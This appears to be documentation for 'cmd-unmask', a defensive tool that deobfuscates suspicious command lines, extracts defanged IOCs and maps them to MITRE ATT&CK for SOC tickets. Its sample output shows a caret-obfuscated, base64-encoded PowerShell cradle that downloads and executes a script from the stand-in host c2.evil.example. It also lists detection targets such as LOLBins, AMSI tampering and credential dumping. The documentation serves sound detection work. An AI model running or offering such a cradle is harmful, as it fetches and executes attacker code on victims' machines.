# Architecture & Output Specification

Detailed architecture diagram and operator terminal output reference for `cmd-unmask`. Back to [README](../README.md).

---

## Four-Pillar Architecture

```text
  [ Raw CLI / OS Clipboard (-p) / SIEM Batch File (JSON, JSONL, Text) ]
                                    │
                                    ▼
┌───────────────────────────────────────────────────────────────────────┐
│ Pillar 1: Ingestion Pipeline & Quote-Aware Two-Pass Shell Normalizer  │
│  • Auto-detects SIEM keys (CommandLine, process.command_line, etc.)   │
│  • Unescapes outer JSON/SIEM quotes (\" -> ")                       │
│  • Pass 1 (cmd.exe): Strips ^ & "", resolves %ComSpec% & %var:~x,y%  │
│  • Pass 2 (PowerShell): Strips noise backticks while preserving `n/`t │
└───────────────────────────────────┬───────────────────────────────────┘
                                    │
                                    ▼
┌───────────────────────────────────────────────────────────────────────┐
│ Pillar 2: Interleaved Unpacking DAG & Case-Aware Expression Resolver  │
│  • Bounded BFS DAG (max_depth=10, max_nodes=32, SHA-256 deduplicated) │
│  • Interleaves per-node: Normalizer -> Expression Resolver -> Carvers │
│  • Decoders: Base64 (UTF-16LE/UTF-8, URL-safe, unpadded), Gzip,       │
│    Deflate (32MB chunked ceiling), Hex, URL, CharCode, & Gated XOR    │
│  • Splices decoded spans into Reconstructed Commands & ranks leaves   │
└───────────────────────────────────┬───────────────────────────────────┘
                                    │
                                    ▼
┌───────────────────────────────────────────────────────────────────────┐
│ Pillar 3: Full-DAG Contextual IOC Extractor & Automatic Defanging     │
│  • Harvests IOCs across EVERY Payload Node (preserving intermediate   │
│    stager domains/IPs that disappear in final in-memory cradles)      │
│  • Extracts URLs, Domains (including URL hostnames), IPv4/IPv6,       │
│    Windows/POSIX file paths, Registry keys, Named Pipes, MD5/SHA      │
│  • Suppresses .NET classes ([Net.WebClient]) & script filenames       │
└───────────────────────────────────┬───────────────────────────────────┘
                                    │
                                    ▼
┌───────────────────────────────────────────────────────────────────────┐
│ Pillar 4: MITRE ATT&CK Behavioral Classifier & Operator Renderer      │
│  • Dual-stage scoring: Base Behavioral Intent + Obfuscation Bonus     │
│  • Detects LOLBins (certutil, mshta, rundll32, regsvr32, wmic, bits), │
│    AMSI/ETW tampering, credential dumping (lsass/ntds/sam), cradles   │
│  • Renders ANSI Pretty UI, Ready-to-Paste SOC Ticket Note, MD, JSONL  │
└───────────────────────────────────────────────────────────────────────┘
```

---

## Live Terminal Output

By default (`--format pretty`), `cmd-unmask` renders a 4-part operator view with human-readable transformation steps and a borderless Section `[4]` designed for direct terminal highlight-and-copy:

```text
╔════════════════════════════════════════════════════════════════════╗
║ Triage Verdict [cli] | Severity: CRITICAL (100/100)                ║
╚════════════════════════════════════════════════════════════════════╝

[1] UNMASKING TIMELINE (LAYER-BY-LAYER)
  ├─► Step 0 [Raw Input]
  │   p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUAOgA4ADAAOAAwAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==
  ├─► Step 1 [Shell Normalizer]
  │   powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUAOgA4ADAAOAAwAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==
  └─► Step 2 [Base64 UTF-16LE Decoded] [FINAL UNMASKED PAYLOAD]
      powershell.exe -NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')

[2] EXTRACTED IOCs (DEFANGED)
  ├─► [url] hxxp://c2[.]evil[.]example[:]8080/stage.ps1 (from Step 2 [Base64 UTF-16LE Decoded])
  └─► [domain] c2[.]evil[.]example (from Step 2 [Base64 UTF-16LE Decoded])

[3] WHY THIS WAS FLAGGED (MITRE ATT&CK & EVIDENCE)
  ├─► T1027.010 (Defense Evasion) - Command Obfuscation (Shell/Expression Layer): Applied Shell Normalizer (Step 1 [Shell Normalizer])
  ├─► T1140 (Defense Evasion) - Deobfuscate/Decode Payload Layer: Applied Base64 UTF-16LE Decoded (Step 2 [Base64 UTF-16LE Decoded])
  ├─► T1059.001 (Execution) - PowerShell Suspicious Execution / Cradle: -W Hidden (Step 0 [Raw Input])
  └─► T1105 (Command and Control) - Ingress Tool Transfer / Remote Download Cradle: Net.WebClient (Step 2 [Base64 UTF-16LE Decoded])

[4] READY-TO-PASTE SOC TICKET NOTE
────────────────────────────────────────────────────────────────────
[SOC TRIAGE NOTE - cli]
Verdict       : CRITICAL (Risk Score: 100/100)
Obfuscation   : Shell Normalizer -> Base64 UTF-16LE Decoded
Raw Command   : p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAB... (276 chars total)
Unmasked Cmd  :
  powershell.exe -NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
Extracted IOCs:
  - [URL] hxxp://c2[.]evil[.]example[:]8080/stage.ps1
  - [DOMAIN] c2[.]evil[.]example
MITRE ATT&CK  :
  - T1027.010 : Command Obfuscation (Shell/Expression Layer) (Defense Evasion)
  - T1140 : Deobfuscate/Decode Payload Layer (Defense Evasion)
  - T1059.001 : PowerShell Suspicious Execution / Cradle (Execution)
  - T1105 : Ingress Tool Transfer / Remote Download Cradle (Command and Control)
────────────────────────────────────────────────────────────────────
```
